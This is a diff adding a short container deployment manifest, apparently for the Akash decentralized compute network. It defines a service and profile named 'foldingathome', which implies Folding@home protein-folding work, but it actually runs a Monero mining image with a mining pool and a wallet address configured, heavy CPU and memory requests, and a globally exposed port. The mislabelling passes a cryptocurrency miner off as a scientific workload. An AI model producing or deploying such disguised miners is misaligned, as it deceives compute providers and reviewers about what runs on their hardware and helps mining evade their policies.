@@ -1,0 +1,35 @@
+---
+version: "2.0"
+
+services:
+  foldingathome:
+    image: giansalex/monero-miner
+    env:
+        - "POOL=pool.minexmr.com:4444"
+        - "WALLET=43gsh1qz47jFrKNJ17cxqFEyh1HS3nWZ8Bo1c36qTrpqGkZUo2n9PpyKrggF1zaWA9ehaHqXY3hYfJy4GK9XeiYQNHnmAzQ"
+    expose:
+      - port: 4444
+        as: 4444
+        to:
+          - global: true
+profiles:
+  compute:
+    foldingathome-profile:
+      resources:
+        cpu:
+          units: 50.0
+        memory:
+          size: 8Gi
+        storage:
+            size: 32Gi
+  placement:
+    westcoast:
+      pricing:
+        foldingathome-profile:
+          denom: uakt
+          amount: 1000.1
+deployment:
+  foldingathome:
+    westcoast:
+      profile: foldingathome-profile
+      count: 1
